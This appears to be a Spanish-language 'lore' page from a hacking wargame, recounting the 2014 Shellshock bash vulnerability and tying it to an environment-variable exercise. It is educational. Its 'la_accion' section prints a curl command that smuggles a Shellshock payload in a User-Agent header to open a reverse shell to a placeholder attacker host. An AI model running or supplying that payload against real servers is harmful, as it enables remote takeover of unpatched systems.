# `/lore/shellshock.md`

```
ARCHIVO CLASIFICADO: t474
ACCESO: lectura
ADVERTENCIA: en narnia1 controlaste una variable de entorno.
             en 2014, eso fue suficiente para tumbar
             servidores en producción en todo el mundo.
```

---

El 12 de septiembre de 2014,
Stéphane Chazelas encontró algo en el código fuente de bash.

No estaba buscando vulnerabilidades.
Estaba leyendo código.
Eso es todo.

Lo que encontró llevaba 25 años ahí.
Y tardó días en destruir servidores en todo el mundo.

---

## `> cat que_paso.txt`

Bash tiene una feature documentada:
puedes exportar funciones como variables de entorno.

```bash
export mifuncion='() { echo "ejecutado"; }'
bash -c "mifuncion"
```

Bash lee la variable.
Bash parsea la función.
Bash la registra.

El problema: bash no sabía dónde terminaba la función.

```bash
export X='() { :; }; echo COMPROMETIDO'
bash -c "X"
```

Bash leía la función.
Seguía parseando.
Ejecutaba `echo COMPROMETIDO`.

Sin preguntar.
Sin validar.
Sin distinguir entre datos e instrucciones.

---

## `> cat la_accion.txt`

Chazelas reportó el bug al equipo de bash el 12 de septiembre.
El 24 de septiembre lo hicieron público: con parche incompleto.

Demasiado tarde.

Los servidores web CGI convierten headers HTTP
en variables de entorno antes de ejecutar scripts.

Un atacante mandaba esto:

```bash
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/atacante/4444 0>&1" http://victima/cgi-bin/script.sh
```

El servidor convertía el header en variable de entorno.
Bash lo parseaba.
Bash ejecutaba el código del atacante.

Sin credenciales.
Sin vulnerabilidad en la aplicación.
Sin tocar el código del servidor.

Solo un header HTTP.
Solo bash siendo bash.

---

## `> cat el_resultado.txt`

En menos de 24 horas después de la publicación: botnets escaneando internet en busca de servidores vulnerables.

Yahoo. WinZip. Servidores del Departamento de Defensa de EE.UU.
Todos comprometidos.

El vector: variables de entorno.
El mismo vector de narnia1.

La diferencia: en narnia1 controlas EGG en local.
En Shellshock, cualquier persona en internet
controlaba las variables de entorno de tu servidor.

La escala cambia.
El principio es idéntico.

Cada vez que un proceso lee una variable de entorno
sin validar su contenido: está confiando en que el mundo exterior es amable.

El mundo exterior no es amable.

---

## `> echo $REFERENCIA`

```
Chazelas, S. (2014). Shellshock: CVE-2014-6271.
Reportado a bash-maintainers@gnu.org, 12 de septiembre de 2014.

Seltzer, L. (2014). Shellshock: Bash bug puts Unix, Linux, Mac systems at risk.
ZDNet, 24 de septiembre de 2014.

// el bug llevaba 25 años en bash antes de que alguien lo leyera.
// Chazelas no buscaba vulnerabilidades.
// solo estaba leyendo código.
// eso es todo lo que se necesita.
```

---

```
████████████████████████████████████████
█                                      █
█   3l 3nt0rn0 n0 3s c0nt3xt0.        █
█                                      █
█         3s t3rr1t0r10.              █
█                                      █
████████████████████████████████████████
```

<!-- lore · t474-r0b07 · EGG no es una variable. es una superficie de ataque. -->
